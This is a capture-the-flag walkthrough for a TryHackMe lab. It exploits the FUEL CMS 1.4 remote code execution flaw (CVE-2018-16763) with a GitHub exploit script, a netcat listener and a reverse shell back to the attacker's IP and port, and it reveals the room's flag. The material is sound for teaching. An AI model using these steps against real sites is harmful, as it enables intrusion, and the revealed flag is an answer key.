TryHackMe | Vulnerability Capstone: https://tryhackme.com/room/vulnerabilitycapstone

1. Deploy the vulnerable machine attached to this task & wait **five minutes** before visiting the vulnerable machine.

2. What is the name of the application running on the vulnerable machine?

> **Method**:
> - Open a web browser and enter the target IP into the URL bar. You will be redirected into a website running HTTP. We know that the machine has HTTP service running.   

> **Answer**: FUEL CMS

3. What is the version number of this application?

> **Method**
> - The answer is in the same page as the answer in Question 1

> **Answer**: 1.4

4. What is the number of the CVE that allows an attacker to remotely execute code on this application?
*Format:** CVE-XXXX-XXXXX

> **Method**
> - The app running is Fuel CMS. The clue here is *remotely execute code*. So we are looking for Remote Code Execution exploit for the app.
> - Open ExploitDB https://www.exploit-db.com and search for "Fuel CMS Remote Code Execution"
> - Open the result at the most top, which is [Fuel CMS 1.4.1 - Remote Code Execution (3)](https://www.exploit-db.com/exploits/50477)

> Answer: CVE-2018-16763 

5. Use the resources & skills learnt throughout this module to find and use a relevant exploit to exploit this vulnerability. 
    **Note:** There are numerous exploits out there that can be used for this vulnerability (some more useful than others!)

> **Hint** 
> - If you are struggling, there is an exploit located on the AttackBox under /usr/share/exploits/vulnerabilitiescapstone

> No answer needed for this one. 

6. What is the value of the flag located on this vulnerable machine? This is located in /home/ubuntu on the vulnerable machine.

> **Hint**
> - Some exploits will require you to setup a netcat reverse listener to gain access to the shell

> **Method**:
> - The exploit given above does not work for my machine. So I find an alternative from GitHub # AssassinUKG | **fuleCMS** https://github.com/AssassinUKG/fuleCMS)
> - Create a .py file with the codes taken from the exploit or download the source code itself. I named it ```cms-rce.py```
> - Before running the script, setup a netcan reverse listener to allow reverse shell connection.
> > Command:
> > ```bash
> > netcat -lnvp 9001 #I use port 9001 for incoming connection
> > ``` 
> - Run the Python reverse shell script
> > Command
> > ```bash
> > python3 cms-rce.py 10.10.12.87 #target IP address
> > ```
> - In the script, enter `shell_me` and IP:PORT
> > ```text
> > fuelCMS$ shell_me
> > Enter IP:PORT $ 10.4.26.94:9001
> >   
> > #my TryHackMe IP and port set in netcat
> > ```
> - After establishing reverse shell connection, verify with `whoami` and all that shit.
> - Referring to the question, navigate to `/home/ubuntu` and use `ls` to find the `flag.txt` file
> - You have found the flag. Congrats.

> **Answer**: THM{ACKME_BLOG_HACKED}

![[fuelcms-exploit.png]]